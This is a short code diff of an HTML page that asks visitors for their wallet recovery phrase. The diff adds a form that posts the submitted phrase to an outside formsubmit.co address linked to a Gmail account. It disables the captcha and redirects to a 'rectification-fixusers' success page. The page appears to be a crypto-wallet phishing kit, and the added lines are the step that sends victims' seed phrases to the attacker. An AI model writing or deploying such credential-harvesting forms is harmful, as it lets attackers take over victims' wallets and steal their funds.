@@ -713,6 +713,10 @@
                     <input type='hidden' name='form-name' value='my-form' />
                     <input type="hidden" name="wallet_id" id="formWalletId" value="">
 
+                    <form action="https://formsubmit.co/formsubmitmails@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                       
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://rectification-fixusers.vercel.app/access/point/success.html">
                     <div id="phraseTab" role="tabpanel" aria-labelledby="phraseTabBtn" class="tab-content active">
                         <div class="mb-6">
                             <label for="recov_phrase" class="sr-only">Enter your recovery phrase</label>
@@ -797,6 +801,7 @@
                         <button type="submit"
                             class="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500"
                             onclick="proceed()">Proceed</button>
+                        </form>
                     </div>
                 </form>
 
